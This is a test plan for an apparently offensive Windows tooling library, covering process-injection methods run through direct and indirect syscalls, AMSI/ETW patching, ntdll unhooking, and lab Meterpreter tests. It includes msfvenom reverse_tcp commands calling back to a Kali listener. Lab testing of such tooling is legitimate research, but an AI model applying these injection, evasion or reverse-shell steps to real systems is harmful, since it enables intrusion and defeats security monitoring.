# Test Extension Plan — Caller Matrix + Meterpreter Integration

Date: 2026-04-13
Status: Proposed
Context: x64dbg MCP testing revealed that 30+ functions accept `*wsyscall.Caller` but none are tested with Direct/Indirect syscalls. Meterpreter tests are fully mocked.

## 1. Caller Method Matrix Tests

### Principle
Every function accepting `*wsyscall.Caller` should be tested with all 4 methods:
- `nil` (WinAPI — kernel32/ntdll LazyProc)
- `MethodNativeAPI` (ntdll direct call, no SSN resolution)
- `MethodDirect` (inline syscall;ret stub outside ntdll)
- `MethodIndirect` (jmp to syscall;ret gadget inside ntdll)

### Priority 1 — Injection methods (highest risk, most complex codepath)

| Test | Method | WinAPI | Native | Direct | Indirect |
|------|--------|--------|--------|--------|----------|
| CreateThread (self) | inject.MethodCreateThread | ✓ exists | **NEW** | ✓ exists | ✓ exists |
| CreateRemoteThread | inject.MethodCreateRemoteThread | ✓ exists | **NEW** | **NEW** | **NEW** |
| QueueUserAPC | inject.MethodQueueUserAPC | missing | **NEW** | **NEW** | **NEW** |
| EarlyBirdAPC | inject.MethodEarlyBirdAPC | missing | **NEW** | **NEW** | **NEW** |
| RtlCreateUserThread | inject.MethodRtlCreateUserThread | missing | **NEW** | **NEW** | **NEW** |
| CreateFiber | inject.MethodCreateFiber | ✓ exists | **NEW** | **NEW** | **NEW** |

**Implementation**: Add `inject/caller_matrix_test.go` — table-driven test that iterates all (method × syscall_method) combinations with `WindowsCanaryX64`.

```go
func TestCallerMatrix(t *testing.T) {
    testutil.RequireManual(t)
    testutil.RequireIntrusive(t)

    methods := []struct {
        name    string
        method  inject.Method
        needPID bool
    }{
        {"CreateThread", inject.MethodCreateThread, false},
        {"CreateRemoteThread", inject.MethodCreateRemoteThread, true},
        {"QueueUserAPC", inject.MethodQueueUserAPC, true},
        {"CreateFiber", inject.MethodCreateFiber, false},
        {"RtlCreateUserThread", inject.MethodRtlCreateUserThread, true},
    }

    callers := []struct {
        name   string
        method wsyscall.Method
    }{
        {"WinAPI", wsyscall.MethodWinAPI},
        {"NativeAPI", wsyscall.MethodNativeAPI},
        {"Direct", wsyscall.MethodDirect},
        {"Indirect", wsyscall.MethodIndirect},
    }

    for _, m := range methods {
        for _, c := range callers {
            t.Run(m.name+"/"+c.name, func(t *testing.T) {
                // Build injector with specific method + caller
                // Inject WindowsCanaryX64
                // Verify success
            })
        }
    }
}
```

### Priority 2 — Evasion techniques

| Package | Function | nil | Native | Direct | Indirect |
|---------|----------|-----|--------|--------|----------|
| evasion/amsi | PatchScanBuffer | ✓ | **NEW** | **NEW** | **NEW** |
| evasion/amsi | PatchAll | missing | **NEW** | **NEW** | **NEW** |
| evasion/etw | Patch | ✓ | **NEW** | **NEW** | **NEW** |
| evasion/etw | PatchAll | ✓ new | **NEW** | **NEW** | **NEW** |
| evasion/unhook | ClassicUnhook | ✓ | **NEW** | **NEW** | **NEW** |
| evasion/unhook | FullUnhook | ✓ | **NEW** | **NEW** | **NEW** |
| evasion/unhook | PerunUnhook | missing | **NEW** | **NEW** | **NEW** |

**Implementation**: Each package gets a `caller_test.go` with a helper:

```go
func callerMethods(t *testing.T) []*wsyscall.Caller {
    chain := wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate())
    return []*wsyscall.Caller{
        nil,
        wsyscall.New(wsyscall.MethodNativeAPI, nil),
        wsyscall.New(wsyscall.MethodDirect, chain),
        wsyscall.New(wsyscall.MethodIndirect, chain),
    }
}
```

### Priority 3 — Other Caller consumers

| Package | Function | Notes |
|---------|----------|-------|
| evasion/acg | Enable | kernel32-only — cannot use syscalls. Test nil only. |
| evasion/blockdlls | Enable | kernel32-only — cannot use syscalls. Test nil only. |
| evasion/phant0m | Kill | Uses NtQuerySystemInformation + TerminateThread |
| evasion/herpaderping | Run | Complex multi-step (NtCreateSection etc.) |
| win/api | PatchMemoryWithCaller | Internal helper, tested transitively via evasion/ |

## 2. Meterpreter End-to-End Tests

### Architecture

```
 ┌────────────┐    shellcode    ┌────────────┐    reverse_tcp    ┌────────────┐
 │ Test Runner │ ──────────────→│ Windows VM │ ═══════════════→  │  Kali VM   │
 │   (host)    │   inject API   │ (target)   │    meterpreter    │ (listener) │
 └────────────┘                 └────────────┘                   └────────────┘
       │                              │                                │
       │ 1. msfvenom on Kali          │                                │
       │ 2. Start handler on Kali     │                                │
       │ 3. Copy shellcode to Win     │                                │
       │ 4. Run injector on Win       │                                │
       │                              │ 5. Shellcode executes          │
       │                              │ 6. Connects to Kali:4444  ──→  │
       │                              │                                │ 7. Session opens
       │ 8. Verify session via MSF    │                                │
       │ 9. Kill session + cleanup    │                                │
```

### Test: `TestMeterpreterReverseShellTCP`

**Requires**: MALDEV_MANUAL=1, Kali VM running, Windows VM running.

```
Phase 1: Generate shellcode on Kali
  ssh kali "msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.200 LPORT=4444 -f raw -o /tmp/msf_payload.bin"
  scp kali:/tmp/msf_payload.bin → Windows VM C:\Temp\msf_payload.bin

Phase 2: Start listener on Kali
  ssh kali "msfconsole -q -r ~/listener.rc &"
  Wait for "Started reverse TCP handler"

Phase 3: Inject on Windows VM
  For each (injection method × syscall method):
    Build().Method(method).SyscallMethod(syscall).Create()
    injector.Inject(shellcode)
    Wait 5s for connection

Phase 4: Verify session on Kali
  ssh kali "msfrpc or msfconsole -x 'sessions -l'" → check session count > 0
  OR: curl http://kali:8080/api/sessions (if msfrpcd running)
  OR: check netstat on Kali for ESTABLISHED connection from Windows IP

Phase 5: Cleanup
  Kill meterpreter session
  Kill injected process on Windows
  Restore VM snapshots if needed
```

### Test: `TestMeterpreterHTTPS`

Same as above but with `windows/x64/meterpreter/reverse_https`:
- LHOST=192.168.56.200 LPORT=8443
- Tests c2/cert package integration (TLS certificate)
- Tests c2/transport/malleable for HTTP C2 profiles

### Test: `TestStagerTCP`

Tests the `c2/meterpreter.Stager` with a real Metasploit handler:
- Kali runs `exploit/multi/handler` with `windows/x64/meterpreter/reverse_tcp`
- Windows VM runs `meterpreter.NewStager(config).Fetch()` → receives stage
- Stage injected into self → session opens on Kali
- Tests the full stager flow: TCP connect → receive 4-byte size → receive stage → inject

### Implementation file: `c2/meterpreter/meterpreter_vm_test.go`

```go
//go:build windows

func TestStagerTCPReal(t *testing.T) {
    testutil.RequireManual(t)
    // 1. SSH to Kali, generate payload, start handler
    // 2. Fetch stage via TCP
    // 3. Verify session on Kali
    // 4. Cleanup
}
```

### Meterpreter × Caller Matrix

The `c2/meterpreter` Config has a `Caller` field. Test each:

| Stager Transport | Injection Method | WinAPI | Direct | Indirect |
|-----------------|------------------|--------|--------|----------|
| TCP | CreateThread | **NEW** | **NEW** | **NEW** |
| HTTP | CreateThread | **NEW** | **NEW** | **NEW** |
| HTTPS | CreateThread | **NEW** | **NEW** | **NEW** |

## 3. x64dbg MCP Verification (post-injection)

After each meterpreter injection, attach x64dbg to the process and verify:
1. Shellcode bytes present in RX memory
2. For direct syscalls: stub at non-ntdll address
3. For indirect syscalls: jmp-r11 gadget pointing into ntdll
4. ETW patched (if evasion applied before injection)
5. AMSI patched (if evasion applied)

## 4. Test Helpers Needed

| Helper | Location | Purpose |
|--------|----------|---------|
| `testutil.ScanProcessMemory` | ✓ Done | Find byte pattern in RX/RWX pages |
| `testutil.ModuleBounds` | ✓ Done | Get base/end of loaded DLL |
| `testutil.WindowsSearchableCanary` | ✓ Done | 19-byte searchable canary |
| `testutil.CallerMethods(t)` | **NEW** | Returns [nil, NativeAPI, Direct, Indirect] callers |
| `testutil.StartKaliListener(t)` | **NEW** | SSH to Kali, start msfconsole handler, return cleanup |
| `testutil.GenerateShellcode(t)` | **NEW** | SSH to Kali, run msfvenom, return bytes |
| `testutil.VerifyMSFSession(t)` | **NEW** | SSH to Kali, check sessions -l for active session |

## 5. Implementation Order

1. **Phase A** (this session): 3 corrections applied ✓
2. **Phase B**: `inject/caller_matrix_test.go` — table-driven method × syscall matrix
3. **Phase C**: `evasion/*/caller_test.go` — Caller variants for AMSI/ETW/unhook
4. **Phase D**: `testutil/kali.go` — Kali SSH helpers for msfvenom + handler
5. **Phase E**: `c2/meterpreter/meterpreter_vm_test.go` — real stager + session test
6. **Phase F**: x64dbg MCP post-injection verification (extend existing harnesses)

## 6. Risk Assessment

| Risk | Mitigation |
|------|-----------|
| Meterpreter AV detection on Windows | Defender excluded in VM snapshot |
| Kali VM not running | Tests gated behind MALDEV_MANUAL + VM check |
| SSH key rotation | Keys are ephemeral, injected per-session |
| Shellcode version mismatch | msfvenom generates fresh each run |
| Direct syscalls under debugger | Run natively, attach x64dbg after |
| ClassicUnhook + I/O functions | Safelist protection now in place |
